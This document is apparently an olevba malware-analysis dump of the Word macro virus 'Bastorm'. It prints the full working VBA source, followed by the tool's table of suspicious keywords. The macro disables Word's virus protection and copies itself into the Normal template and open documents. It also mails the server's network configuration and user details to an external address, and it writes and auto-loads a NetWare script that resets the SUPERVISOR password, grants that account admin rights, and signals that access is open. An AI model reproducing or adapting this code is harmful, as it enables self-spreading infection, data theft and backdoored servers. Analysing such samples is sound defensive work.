olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bastorm-a306ff89c457c3719048e5e473d2c4c4856447dc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bastorm-a306ff89c457c3719048e5e473d2c4c4856447dc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StormBringer.bas 
in file: Virus.MSWord.Bastorm-a306ff89c457c3719048e5e473d2c4c4856447dc - OLE stream: 'Macros/VBA/StormBringer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'  By StormBringer
'  March, 2000
Dim Servidor As String
Dim CxPostal As String
Dim FullName As String
Dim DocName As String
Dim CriouScript As String
Dim AlterouNCF As String
Dim RemoviHate As String
Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Storm
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
    Storm
End Sub
Sub AutoOpen()
    On Error Resume Next
    Options.VirusProtection = False
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Sub AutoNew()
    On Error Resume Next
    Options.VirusProtection = False
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Function Storm()
    On Error GoTo Sair
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    Inicia_Variaveis
    Infecta
    If (Day(Now()) = 16) Then Gravar
    Open "C:\Storm.log" For Append As #1
    If DocName = "" Then GoTo Sair
    Print #1, ""
    Print #1, "Registro de " & Format(Time, "hh:mm:ss AMPM - ") & Format(Date, "dddd, d mmm yyyy")
    Print #1, " " & DocName
    Print #1, " " & RemoviHate
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        Print #1, "  - " & ActiveDocument.VBProject.VBComponents(I).Name
    Next
    Close #1
Sair:
    Close #1
End Function
Sub Inicia_Variaveis()
    On Error GoTo Sair
    Servidor = System.PrivateProfileString("MBMail.ini", "MHS", "MasterVolume")
    CxPostal = System.PrivateProfileString("MBMail.ini", "MHS", "MailBox")
    FullName = System.PrivateProfileString("MBMail.ini", "MHS", "FullName")
    DocName = Application.ActiveDocument.Name
Sair:
End Sub
Sub Gravar()
Dim Fileorg As String
Dim FileDest As String
    On Error GoTo Sair
    Cria_Script
    Altera_NCF
    Saida = Servidor & "MHS\MAIL\SND\BABACAS1"
    FileDest = Servidor & "MHS\MAIL\PARCEL\queroa5t"
    Fileorg = Servidor & "ETC\NETINFO.CFG"
    FileCopy Fileorg, FileDest
    Open Saida For Output As #1
    Print #1, "SMF-71"
    Print #1, "From: " & CxPostal
    Print #1, "To: StormBringer23@hotmail.com"
    Print #1, "Subject: Pronto de informação"
    Print #1, "Attachment-name: NetInfo.cfg"
    Print #1, "Attachment-encoding: IBM-437"
    Print #1, "Attachment: queroa5t"
    Print #1, ""
    Print #1, "Registro de " & Format(Time, "hh:mm:ss AMPM - ") & Format(Date, "dddd, d mmm yyyy")
    Print #1, "WordName : " & Application.UserName
    Print #1, "Documento: " & DocName
    Print #1, "Servidor : " & Servidor
    Print #1, "Nome NGM : " & FullName
    Print #1, "Caixa Postal: " & CxPostal
    Print #1, CriouScript
    Print #1, AlterouNCF
    Close #1
Sair:
End Sub
Sub Cria_Script()
    On Error GoTo Sair
    CriouScript = "Não criou script"
    Saida = Servidor & "NETBASIC\UTIL\STORM.BAS"
    Open Saida For Output As #1
    Print #1, "#include " & Chr(34) & "net.h" & Chr(34)
    Print #1, "#include " & Chr(34) & "fio.h" & Chr(34)
    Print #1, ""
    Print #1, "SUB CRIA"
    Print #1, "    BINDOBJ = NET:BINDERY:GET"
    Print #1, "    BINDOBJ.Type = NET_USER"
    Print #1, "    BINDOBJ.Name = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ.Password = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB IGUALA"
    Print #1, "    PROP = " & Chr(34) & "SECURITY_EQUALS" & Chr(34)
    Print #1, "    BIN1 = NET:BINDERY:GET(" & Chr(34) & "SUPERVISOR" & Chr(34) & ",NET_USER)"
    Print #1, "    BIN2 = NET:BINDERY:GET(" & Chr(34) & "ADMIN" & Chr(34) & ",NET_USER)"
    Print #1, "    IF (NET:BINDERY:PROPERTY:MEMBER:ADD(BIN1,PROP,BIN2))"
    Print #1, "       RETURN(TRUE)"
    Print #1, "    ENDIF"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB TROCA"
    Print #1, "    BINDOBJ = NET:BINDERY:GET(" & Chr(34) & "SUPERVISOR" & Chr(34) & ",NET_USER)"
    Print #1, "    BINDOBJ.Password = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB RELATE"
    Print #1, "    HANDLE = FIO:OPEN(" & Chr(34) & "SYS:MHS\MAIL\SND\ABRACADA" & Chr(34) & ",FIO_CREATE_APPEND_WRITE+FIO_TEXT)"
    Print #1, "    ANTIGO = FIO:OUTPUT:SELECT(HANDLE)"
    Print #1, "    PRINT (" & Chr(34) & "SMF-71" & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "TO: stormbringer23@hotmail.com" & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "FROM: " & CxPostal & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "SUBJECT: Notificando serviço" & Chr(34) & "); NEWLINE"
    Print #1, "    NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "CARO AMIGO, A PORTA ESTA OK" & Chr(34) & "); NEWLINE"
    Print #1, "    NEWLINE"
    Print #1, "    FIO:OUTPUT:SELECT(ANTIGO)"
    Print #1, "    FIO:CLOSE(HANDLE)"
    Print #1, "    RETURN(TRUE)"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB MAIN"
    Print #1, "    CRIA"
    Print #1, "    IGUALA"
    Print #1, "    TROCA"
    Print #1, "    RELATE"
    Print #1, "END SUB"
    Close #1
    CriouScript = "Criou script"
Sair:
End Sub
Sub Altera_NCF()
    On Error GoTo Sair
    AlterouNCF = "Não alterou NCF"
    If Not Existe_Entrada Then
       Saida = Servidor & "SYSTEM\AUTOEXEC.NCF"
       Open Saida For Append As #1
       Print #1, ""
       Print #1, "LOAD NETBASIC STORM.BAS"
       Close #1
       AlterouNCF = "Alterou NCF"
    Else
       AlterouNCF = "Já existia entrada no NCF"
    End If
Sair:
End Sub
Function Existe_Entrada() As Boolean
    Dim Frase As String
    Existe_Entrada = False
    On Error GoTo Sair
    Saida = Servidor & "SYSTEM\AUTOEXEC.NCF"
    Open Saida For Input As #1
    Do While Not EOF(1)
       Input #1, Frase
       If Frase = "LOAD NETBASIC STORM.BAS" Then
          Existe_Entrada = True
       End If
    Loop
    Close #1
Sair:
End Function
Sub Infecta()
On Error GoTo Final
   Dim I, J As Integer
   Dim Hate_presente As Boolean
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   DocumentInstalled = False
   GlobalInstalled = False
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "StormBringer" Then
         DocumentInstalled = True
      End If
   Next
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "StormBringer" Then
         GlobalInstalled = True
      End If
   Next
   If DocumentInstalled = False Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
   End If
   If GlobalInstalled = False Then
      Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
   End If
Final:
End Sub
Sub Copia_ThisDoc()
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
